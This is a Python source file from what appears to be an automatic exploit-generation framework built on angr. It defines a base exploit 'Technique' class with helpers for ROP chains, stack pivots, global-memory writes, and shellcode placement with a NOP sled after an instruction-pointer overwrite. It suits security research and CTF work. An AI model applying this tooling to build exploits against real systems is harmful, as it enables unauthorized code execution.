import angr
import logging
from rex.exploit import CannotExploit
from angrop.errors import RopException

l = logging.getLogger("rex.exploit.technique")

class Technique(object):
    '''
    Represents an exploit techinue
    '''

    applicable_to = [ ]

    bitmask_threshold = 20

    def __init__(self, crash, rop, shellcode):
        '''
        :param crash: a crash object representing the state at crash time
        :param rop: an angr rop object for finding and requesting chains
        :param shellcode: a shellcode manager to query for shellcode
        '''

        self.crash = crash.copy()
        self.rop = rop
        self.shellcode = shellcode

    def apply(self, **kwargs):
        '''
        Applies the exploit technique to the crashing state, returns a working Exploit object
        or raises a CannotExploit exception
        :return: an Exploit object
        '''

        raise NotImplementedError


### EXPLOIT HELPERS ###
    def reduce_claimed_bitmask(self, bitmask, bitcnt):
        """
        The idea here is there could be constraints such as no "\n" or no null bytes
        So we will try to claim control of a max of 7/8 bits in the bitmask
        :param bitmask: the controlled bitmask
        :param bitcnt: the controlled bitcnt
        :return: the new bitmask
        """

        out_mask = 0

        for byte_index in range(4):
            byte = (bitmask >> 8*byte_index) & 0xff
            # if the byte has all bits set and we have extra bits, unset one bit
            if byte == 0xff and bitcnt > self.bitmask_threshold:
                bitcnt -= 1
                byte = 0x7f
            out_mask |= (byte << 8*byte_index)

        return out_mask

    @staticmethod
    def check_bitmask(state, ast, bitmask):
        # a quick check with some bit patterns to verify control
        size = ast.size()
        test_val_0 = 0x0
        test_val_1 = (1 << size) - 1
        test_val_2 = int("1010"*16, 2) % (1 << size)
        test_val_3 = int("0101"*16, 2) % (1 << size)
        # chars need to be able to be different
        test_val_4 = int(("1001"*2 + "1010"*2 + "1011"*2 + "1100"*2 + "1101"*2 + "1110"*2 + "1110"*2 + "0001"*2), 2) \
            % (1 << size)
        if not state.se.satisfiable(extra_constraints=(ast & bitmask == test_val_0 & bitmask,)):
            return False
        if not state.se.satisfiable(extra_constraints=(ast & bitmask == test_val_1 & bitmask,)):
            return False
        if not state.se.satisfiable(extra_constraints=(ast & bitmask == test_val_2 & bitmask,)):
            return False
        if not state.se.satisfiable(extra_constraints=(ast & bitmask == test_val_3 & bitmask,)):
            return False
        if not state.se.satisfiable(extra_constraints=(ast & bitmask == test_val_4 & bitmask,)):
            return False
        return True

    def get_bitmask_for_var(self, state, var):

        # filter vars with only one value
        if len(state.se.eval_upto(var, 2)) == 1:
            return 0, 0

        # test each bit of the var
        unconstrained_bitmask = 0
        unconstrained_bitcnt = 0
        for bit in range(var.size()):
            l.debug("testing symbolic control of bit %d in var %s", bit, var)
            if len(state.se.eval_upto(var & 1 << bit, 2)) == 2:
                unconstrained_bitcnt += 1
                unconstrained_bitmask |= (1 << bit)
        l.debug("unconstrained bitmask %#x", unconstrained_bitmask)

        # reduce the number of claimed bits
        unconstrained_bitmask = self.reduce_claimed_bitmask(unconstrained_bitmask, unconstrained_bitcnt)
        unconstrained_bitcnt = bin(unconstrained_bitmask).count("1")

        if not self.check_bitmask(state, var, unconstrained_bitmask):
            raise CannotExploit("computed bitmask does not appear to be valid")

        l.debug("reduced bitmask %#x", unconstrained_bitmask)
        return unconstrained_bitmask, unconstrained_bitcnt

    def _stack_control(self):
        '''
        determine what symbolic memory we control equal to or beneath sp
        '''

        control = { }

        if self.crash.state.se.symbolic(self.crash.state.regs.sp):
            l.warning("detected symbolic sp when guaging stack control")
            return control

        sp = self.crash.state.se.eval(self.crash.state.regs.sp)
        for addr in self.crash.symbolic_mem:
            # if the region is above sp it gets added
            if addr > sp:
                control[addr] = self.crash.symbolic_mem[addr]

            # if sp falls into the region it gets added starting at sp
            if sp < addr + self.crash.symbolic_mem[addr]:
                control[sp] = addr + self.crash.symbolic_mem[addr] - sp

        return control


    def _global_control(self):
        '''
        determine what symbolic memory we control which is at a constant address
        '''

        control = { }

        # PIE binaries will give no global control without knowledge of the binary base
        if self.crash.project.loader.main_object.pic:
            return control

        min_addr = self.crash.project.loader.main_object.min_addr
        max_addr = self.crash.project.loader.main_object.max_addr
        for addr in self.crash.symbolic_mem:
            if addr >= min_addr and addr < max_addr:
                control[addr] = self.crash.symbolic_mem[addr]

        return control

    def _write_global_data(self, data):
        '''
        write @data into globally addressable memory
        :return: tuple of the address of the string and the constraint which adds the string
        '''
        glob_control = self._global_control()

        # try all variations of commands at every global address
        for base in glob_control:
            for addr in range(base, base+glob_control[base]):
                constraint = self.crash.state.memory.load(addr, len(data)) == self.crash.state.se.BVV(data)
                if self.crash.state.se.satisfiable(extra_constraints=(constraint,)):
                    data_str_addr = addr
                    data_str_constraint = constraint
                    return (data_str_addr, data_str_constraint)

        return (None, None)

    def _find_global_address_for_string(self, data):
        return self.crash.project.loader.main_object.max_addr - len(data)

    def _read_in_global_data(self, data):
        '''
        call a read with with rop into globally addressable memory
        '''

        # turn off file size limit
        self.crash.state.posix.files[0].size = None

        # first try doing it with a call to read
        addr, cons = self._read_in_global_data_with_read(data)
        if not addr is None:
            return addr, cons

        # next try it with a call to gets
        addr, cons = self._read_in_global_data_with_gets(data)
        if not addr is None:
            return addr, cons

        return None, None

    def _read_in_global_data_with_read(self, data):
        '''
        use the linked function read to read in more global data
        :return: tuple of the address and constraints to add
        '''

        addr = self._find_func_address("read")
        # failed to find address
        if addr is None:
            return None, None

        # sanity check this address
        read_to = self._find_global_address_for_string(data)

        # TODO add an option for preferred file descriptor here
        try:
            chain = self.rop.func_call(addr, [0, read_to, len(data)])
        except RopException:
            return None, None

        # check if the chain can exist
        chain, chain_addr = self._ip_overwrite_with_chain(chain)

        # constrain the address to be the chain
        chain_mem = self.crash.state.memory.load(chain_addr, len(chain.payload_str()))
        chain_bvv = self.crash.state.se.BVV(chain.payload_str())
        # the chain should be guaranteed to be satisfiable here
        self.crash.state.add_constraints(chain_mem == chain_bvv)

        # TODO make sure we can still read an unconstrained successor
        # windup the state to introduce the new bytes and fix up the state for insert other chains
        self._windup_to_unconstrained_successor()

        glob_data = self.crash.state.memory.load(read_to, len(data))
        data_bvv  = self.crash.state.se.BVV(data)
        return read_to, (glob_data == data_bvv)

    def _read_in_global_data_with_gets(self, data):
        '''
        use the linked function gets to read in more global data
        :return: tuple of the address and constraints to add
        '''

        addr = self._find_func_address("gets")
        # failed to find address
        if addr is None:
            return None, None

        # sanity check this address
        read_to = self._find_global_address_for_string(data)

        # TODO add an option for preferred file descriptor here
        try:
            chain = self.rop.func_call(addr, [read_to])
        except RopException:
            return None, None

        # check if the chain can exist
        chain, chain_addr = self._ip_overwrite_with_chain(chain)

        # constrain the address to be the chain
        chain_mem = self.crash.state.memory.load(chain_addr, len(chain.payload_str()))
        chain_bvv = self.crash.state.se.BVV(chain.payload_str())
        # the chain should be guaranteed to be satisfiable here
        self.crash.state.add_constraints(chain_mem == chain_bvv)

        # TODO make sure we can still read an unconstrained successor
        # windup the state to introduce the new bytes and fix up the state for insert other chains
        self._windup_to_unconstrained_successor()

        glob_data = self.crash.state.memory.load(read_to, len(data))
        data_bvv  = self.crash.state.se.BVV(data)
        return read_to, (glob_data == data_bvv)

    def _find_func_address(self, symbol):
        '''
        find the address of a function given it's name @symbol
        :param symbol: function name to lookup
        :return: the function's address or None if the function is not present
        '''

        address = None
        symobj = self.crash.project.loader.main_object.get_symbol(symbol)
        if symbol in self.crash.project.loader.main_object.plt:
            address = self.crash.project.loader.main_object.plt[symbol]
        elif symobj is not None:
            address = symobj.rebased_addr

        return address

    def _windup_to_unconstrained_successor(self, state=None):
        '''
        windup of the state of the crash to the first unconstrained successor
        '''

        if state is None:
            state = self.crash.state

        successors = self.crash.project.factory.successors(state)
        if len(successors.unconstrained_successors) == 0:
            return self._windup_to_unconstrained_successor(successors.flat_successors[0])

        # extend the prev actions path the actions encountered
        self.crash.added_actions.extend(successors.unconstrained_successors[0].history.recent_actions)
        self.crash.state = successors.unconstrained_successors[0]

    def _at_syscall(self, path):

        return self.crash.project.factory.block(path.addr,
                num_inst=1).vex.jumpkind.startswith("Ijk_Sys")

    def _windup_to_syscall(self, state):
        '''
        windup state to a state just about to make a syscall
        '''

        if self._at_syscall(state):
            return state

        successors = self.crash.project.factory.successors(state)
        if len(successors.flat_successors) > 0:
            return self._windup_to_syscall(successors.flat_successors[0])

        raise CannotExploit("unable to reach syscall instruction")

    def _ip_overwrite_call_shellcode(self, shellcode, variables=None):
        '''
        exploit an ip overwrite with shellcode
        :param shellcode: shellcode to call
        :param variables: variables to check unconstrainedness of
        :return: tuple of the address to jump to, and address of requested shellcode in memory
        '''

        # TODO inspect register state and see if any registers are pointing to symbolic memory
        # if any registers are pointing to symbolic memory look for gadgets to call or jmp there

        if variables is None:
            variables = [ ]

        # accumulate valid memory, this depends on the os and memory permissions
        valid_memory = { }

        # XXX don't handle ASLR elegantly at the moment, maybe when angr supports it we can query a page for randomness
        if not self.crash.aslr or self.crash.os == "cgc":
            for mem in self.crash.symbolic_mem:
                # ask if the mem is executable
                prots = self.crash.state.memory.permissions(mem)
                if self.crash.state.se.eval(prots) & 4: # PROT_EXEC is 4
                    valid_memory[mem] = self.crash.symbolic_mem[mem]

        # XXX linux special case, bss is executable if the stack is executable
        if self.crash.project.loader.main_object.execstack and self.crash.os == "unix":
            valid_memory.update(self._global_control())

        # hack! max address hueristic for CGC
        for mem, _ in sorted(valid_memory.items(),
                key=lambda x: (0xffffffff - x[0]) + x[1])[::-1]:
            for mem_start in range(mem+valid_memory[mem]-(len(shellcode)//8), mem, -1):

                # default jump addr is the shellcode
                jump_addr = mem_start

                shc_constraints = [ ]

                shc_constraints.append(self.crash.state.regs.ip == mem_start)

                sym_mem = self.crash.state.memory.load(mem_start, len(shellcode)//8)
                shc_constraints.append(sym_mem == shellcode)

                # hack! TODO: make this stronger/more flexible
                for v in variables:
                    shc_constraints.append(v == 0x41414141)

                if self.crash.state.satisfiable(extra_constraints=shc_constraints):

                    # room for a nop sled?
                    length = mem_start - mem
                    if length > 0:

                        # try to add a nop sled, we could be more thorough, but it takes too
                        # much time
                        new_nop_constraints = [ ]

                        sym_nop_mem = self.crash.state.memory.load(mem, length)
                        nop_sld_bvv = self.crash.state.se.BVV(b"\x90" * length)
                        nop_const = sym_nop_mem == nop_sld_bvv

                        # can the nop sled exist?
                        new_nop_constraints.append(nop_const)
                        # can the shellcode still exist?
                        new_nop_constraints.append(sym_mem == shellcode)
                        # can ip point to the nop sled?
                        new_nop_constraints.append(self.crash.state.regs.ip == mem)

                        if self.crash.state.satisfiable(extra_constraints=new_nop_constraints):
                            jump_addr = mem

                    return jump_addr, mem_start

        raise CannotExploit("no place to fit shellcode")

    def _ip_overwrite_with_chain(self, chain, state=None, assert_next_ip_controlled=False):
        '''
        exploit an ip overwrite using rop
        :param chain: rop chain to use
        :param state: an optionally state to work off of
        :param assert_next_ip_controlled: if set we use heuristics to ensure control of the next ip
        :return: a tuple containing a new constrained chain and the address to place the chain
        '''

        if state is None:
            state = self.crash.state

        sp = state.se.eval(state.regs.sp)

        # first let's see what kind of stack control we have
        symbolic_stack = self._stack_control()
        if len(symbolic_stack) == 0:
            l.warning("no controlled data beneath stack, need to resort to shellcode")
            raise CannotExploit("no controlled data beneath sp")

        chain_addr = None
        stack_pivot = None
        # loop until we can find a chain which gets us to our setter gadget
        for addr in symbolic_stack:
            # increase payload length by wordsize for the final ip hijack
            chain_req = chain.payload_len + self.crash.project.arch.bytes

            # is the space too small?
            if not symbolic_stack[addr] >= chain_req:
                continue

            # okay we have a symbolic region which fits and is below sp
            # can we pivot there?
            for gadget in self.rop.gadgets:
                # let's make sure the gadget is sane

                # TODO: consult state before throwing out a gadget, some of these memory
                # accesses might be acceptable
                if len(gadget.mem_changes + gadget.mem_writes + gadget.mem_reads) > 0:
                    continue

                # if we assume all gadgets end in a 'ret' we can subtract 4 from the stack_change
                # as we're not interested in the ret's effect on stack movement, because when the
                # ret executes we'll have chain control
                jumps_to = sp + (gadget.stack_change - self.crash.project.arch.bytes)
                # does it hit the controlled region?
                if jumps_to >= addr and jumps_to < addr + symbolic_stack[addr]:
                    # it lands in a controlled region, but does our chain fit?
                    offered_size = symbolic_stack[addr] - (jumps_to - addr)
                    if offered_size >= chain_req:
                        # we're in!
                        chain_addr = jumps_to
                        stack_pivot = gadget

                        scratch = state.copy()
                        chain_cp = chain.copy()

                        # test to see if things are still satisfiable
                        chain_constraints = [ ]

                        chain_constraints.append(state.regs.ip == stack_pivot.addr)

                        # TODO: update rop to make this possible without refering to internal vars
                        # we constrain our rop chain to being equal to our payload, preventing the chain builder
                        # from putting illegal characters into positions we don't care about
                        for cons in chain_cp._blank_state.se.constraints:
                            scratch.add_constraints(cons)

                        chain_bytes = chain_cp.payload_bv()
                        payload_bytes = scratch.memory.load(chain_addr, chain.payload_len)

                        scratch.add_constraints(chain_bytes == payload_bytes)

                        chain_cp._blank_state = scratch

                        mem = state.memory.load(chain_addr, chain_cp.payload_len)

                        try:
                            cbvv = state.se.BVV(chain_cp.payload_str())
                        except angr.SimUnsatError:
                            # it's completely possibly that the values we need need in the chain can't exist due to
                            # constraints on memory, for example if we need the value '1' to exist in our chain, when
                            # our chain enter the process memory space with a 'strcpy', '1' cannot exist because its
                            # value will contain null bytes
                            continue # the chain itself cannot exist here

                        chain_constraints.append(mem == cbvv)

                        # if the chain can't be placed here, let's try again
                        if not state.satisfiable(extra_constraints=chain_constraints):
                            continue

                        # extra checks for ip control
                        if assert_next_ip_controlled:
                            ip_bv = scratch.memory.load(chain_addr + chain.payload_len, self.crash.project.arch.bytes)
                            if not state.satisfiable(extra_constraints=chain_constraints + [ip_bv == 0x41414141]):
                                continue
                            if not state.satisfiable(extra_constraints=chain_constraints + [ip_bv == 0x56565656]):
                                continue

                        # constrain eip to equal the stack_pivot
                        state.add_constraints(state.regs.ip == stack_pivot.addr)
                        return chain_cp, chain_addr

        raise CannotExploit("unable to insert chain")
